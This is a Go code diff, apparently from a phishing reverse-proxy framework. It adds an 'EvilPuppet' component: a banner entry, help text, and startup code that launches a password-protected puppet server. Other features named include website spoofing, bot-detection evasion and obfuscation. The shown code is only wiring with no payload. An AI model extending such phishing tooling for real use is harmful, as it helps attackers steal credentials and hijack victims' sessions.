@@ -39,12 +39,12 @@ func showEnhancedEditionInfo() {
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
 	dgray := color.New(color.FgWhite)
-	message := fmt.Sprintf("%s %s", hcyan.Sprint("Enhanced Edition:"), white.Sprint("REST API, Botguard, Notifications, JS/HTML Obfuscation, Website Spoofing, AES-256 Encryption, Multi-Domain Support"))
+	message := fmt.Sprintf("%s %s", hcyan.Sprint("Enhanced Edition:"), white.Sprint("EvilPuppet, REST API, Botguard, Notifications, JS/HTML Obfuscation, Website Spoofing, AES-256 Encryption, Multi-Domain Support"))
 	log.Info("%s", message)
 	log.Info("")
-	log.Info("%s", dgray.Sprint("  Quick start:  help <command>   |  New commands: notify, api, botguard"))
-	log.Info("%s", dgray.Sprint("  Notifications: help notify     |  Bot detection: help botguard"))
-	log.Info("%s", dgray.Sprint("  REST API:      help api        |  Proxy profiles: help proxy"))
+	log.Info("%s", dgray.Sprint("  Quick start:  help <command>   |  New commands: puppet, notify, api, botguard"))
+	log.Info("%s", dgray.Sprint("  EvilPuppet:    help puppet     |  Notifications: help notify"))
+	log.Info("%s", dgray.Sprint("  Bot detection: help botguard   |  REST API:      help api"))
 	log.Info("")
 }
 
@@ -178,7 +178,15 @@ func main() {
 	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
 	hp.Start()
 
-	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
+	// Initialize EvilPuppet system
+	puppet := core.NewPuppetManager(cfg, db)
+	puppetServer := core.NewPuppetServer(puppet, puppet.GetPort(), puppet.GetPassword())
+	puppet.SetServer(puppetServer)
+	puppetServer.Start()
+
+	log.Info("EvilPuppet ready on port %d (password: %s)", puppet.GetPort(), puppet.GetPassword())
+
+	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode, puppet)
 	if err != nil {
 		log.Fatal("%v", err)
 		return
